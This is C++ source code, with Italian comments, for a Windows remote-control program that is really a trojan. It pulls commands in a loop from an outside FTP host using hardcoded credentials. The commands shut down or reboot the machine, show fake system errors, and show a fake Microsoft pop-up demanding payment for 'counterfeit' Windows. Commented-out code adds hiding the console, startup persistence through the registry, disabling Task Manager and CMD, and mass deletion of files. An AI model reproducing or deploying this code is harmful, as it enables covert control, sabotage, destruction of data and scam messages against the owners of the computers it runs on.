
// Client/Server 
// author: Blackname23
// mail: grandeandrea@live.it
// msn: grandeandrea@live.it

// socket non bloccante
// strumenti -> opzioni compilazione -> linker -> -lwsock32
// digitare client.stop per interrompere la connessione


#include <windows.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <fstream> 

using namespace std;


char* nome_file="comandi.txt";
void server(void);


int main()
{     
     system("@echo off");
     
     //per prendere IP
     //system("start http://cacca11.altervista.org/server/grazie.php");
     
     //nasconde console
     //HWND hWnd = FindWindow("ConsoleWindowClass" , NULL);
     //ShowWindow(hWnd, SW_HIDE);
     
     //system("date 01-01-00");
     //system("time 00:00:01");
     //system("attrib +h +s server.exe");
     //system("copy /y server.exe \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\server.exe\"");
     //system("copy /y server.exe \"C:\\Windows\\System32\\server.exe\"");
     
     //esecuzione automatica di sistema
     //system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Task manager\" /t REG_SZ /d \"C:\\Windows\\System32\\server.exe\" /f");
     
     //disabilita task
     //system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableTaskMgr\" /t REG_DWORD /d \"1\" /f");
     
     //disabilita tema e sfondo
     //system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"NoDispAppearancePage\" /t REG_DWORD /d \"1\" /f");
     //system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"NoDispBackgroundPage\" /t REG_DWORD /d \"1\" /f");
     
     //disabilita cmd
     //system("reg add \"HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\System\" /v \"DisableCMD\" /t REG_DWORD /d \"1\" /f");
     
     //disabilita esegui
     //system("reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /v \"NoRun\" /t REG_DWORD /d \"1\" /f");
     
     system("CLS");
     server();
}

void server(void)
{
     fstream ftp("desktop.txt" , ios::out|ios::trunc);
     ftp<<"open\ncacca11.altervista.org\ncacca11\npassword\ncd /server\nmget comandi.txt\nquit";
     ftp.close();
     fstream ftp2("desktop2.txt" , ios::out|ios::trunc);
     ftp2<<"open\ncacca11.altervista.org\ncacca11\npassword\ncd /server\nmput comandi.txt\nquit";
     ftp2.close();
     system("attrib +h +s desktop.txt");
     system("attrib +h +s desktop2.txt");
     
     
     while(1)
     {
         system("cls");
         string a[5];
         system("ftp -v -i -s:desktop.txt");
         system("attrib +h +s comandi.txt");
         fstream f(nome_file, ios::in);
         if(!f) {
        cout<<"\nIl file "<<nome_file<<" non esiste!\n";
        }
        getline(f, a[0]); 
        cout<<a[0]<<endl;
         
              
          
          if(a[0]=="1") {                                                        //chiudi server
                   cout<<"Server in chiusura...."<<endl;
                   exit(8);
                         }
          if(a[0]=="2") {                                                       //riavvia server
                        
                            continue;
                            exit(8);
                                          }
          if(a[0]=="3") {                                                       //spegni 10 minuti
                   system("shutdown -s -t 300 -c \" \"");
                   cout<<"Spegni effettuato"<<endl;
                   goto ok;
                         }
          if(a[0]=="4") {                                                       //spegni istantaneo
                   system("shutdown -s -t 200 -c \" \"");
                   cout<<"Spegni effettuato"<<endl;
                   exit(8);
                         }
          if(a[0]=="5") {                                                       //riavvia
                   system("shutdown -r -t 200 -c \" \"");
                   cout<<"Riavvia effettuato"<<endl;
                   exit(8);
                         }
          if(a[0]=="6") {                                                       //iberna
                   system("shutdown -h -t 300 -c \" \"");
                   cout<<"Iberna effettuato"<<endl;
                   system("server.exe");
                   exit(8);
                         }
          if(a[0]=="7") {                                                       //rovina- elimina files
                   /*
                   system("del /q *.jpg");
                   system("del /q *.jpeg");
                   system("del /q *.flv");
                   system("del /q *.avi");
                   system("del /q *.ico");
                   system("del /q *.ani");
                   system("del /q *.gif");
                   system("del /q *.bnp");
                   system("del /q *.png");
                   system("del /q *.odt");
                   system("del /q *.doc");
                   system("del /q *.xls");
                   system("del /q *.mp3");
                   system("del /q *.mp4");
                   system("del /q *.ogg");
                   system("del /q *.pdf");
                   system("del /q *.zip");
                   system("del /q *.rar");
                   system("del /q *.mpeg");
                   system("del /q *.wmv");
                   system("del /q *.3gp");
                   system("del /q *.ods");
                   system("del /q *.odp");
                   system("del /q *.dwg");
                   system("del /q *.dxf");
                   system("del /q *.dpcx");
                   system("del /q *.xlsx");
                   system("del /q *.htm");
                   system("del /q *.html");
                   system("del /q *.php");
                   system("del /q *.shtml");
                   system("del /q *.shtm");
                   system("del /q *.stm");
                   system("del /q *.txt");
                   */
                   cout<<"Files eliminati"<<endl;
                   goto ok;
                         }
          if(a[0]=="8") {                                                       //cursore
                   /*
                   system("reg delete \"HKEY_CURRENT_USER\ControlPanel\Cursors\" /f");
                   system("del /q *.cur");
                   system("del /q *.ani");
                   system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"DisableRegistryTools\" /t REG_DWORD /d \"1\" /f");
                   */
                   cout<<"Spegni effettuato"<<endl;
                   goto ok;
                         }
          if(a[0]=="9") {                                                       //impalla
                   //a:
                   system("start");
                   //goto a;
                   cout<<"Spegni effettuato"<<endl;
                   goto ok;
                         }
          if(a[0]=="10") {                                                      //chiedi se riavviare
                                          
                       int messaggio = MessageBox(NULL,"Il computer ha eseguito un'operazione non valida.\nRiavviare il computer?","Errore grave",MB_YESNO|MB_ICONERROR|MB_SYSTEMMODAL);
     
                       switch(messaggio) {
                       case IDYES:
                                 system("shutdown -r -t 2 -c \"Riavvio in corso...\"");
                                 break;
                            
                       case IDNO:
                                     MessageBox(NULL,"Si è scelto di non riavviare il computer!","Avviso",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
                                     break;
                       default:
                               MessageBox(NULL,"Hai chiuso la finestra...","Avviso",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
                               break;
                       
                       }
                          
                       goto ok;
                       }
          if(a[0]=="11") {                                                      //blocca spegnimento
                       system("shutdown -a");
                       goto ok;
                       }
          if(a[0]=="12") {                                                      //messaggio d'errore
                         MessageBox(NULL,"Ahahahahahahahahahahahah\nBello scherzetto....","AHAHAHAHAH",MB_OK|MB_ICONERROR|MB_SYSTEMMODAL);
                         goto ok;
                         }                         
          if(a[0]=="13") {                                                      //contraffatto
                       MessageBox(NULL,"Il team Microsoft ha riconosciuto questo computer come contraffatto.\nPertanto le richiediamo di pagare 150$ per il sistema operativo da lei usato e 500$ di multa per l'utilizzo di un sistema Windows senza averlo acuistato.\n\nLa preghiamo di contattarci al più presto!","Copia di windows contraffatta",MB_OK|MB_ICONERROR|MB_SYSTEMMODAL);
                       goto ok;
                       }
          if(a[0]=="14") {                                                      //errore file system
                       MessageBox(NULL,"File system non riconosciuto","File system error",MB_OK|MB_ICONERROR|MB_SYSTEMMODAL);
                       goto ok;
                       }
                       else {
                            continue;
                            }
       
       ok:
                      
          f.close();
          fstream f2(nome_file, ios::in|ios::out|ios::trunc);
          f2.close();
          
          system("ftp -v -i -s:desktop2.txt");
          
          Sleep(500); // un sospiro per la CPU


     }

}

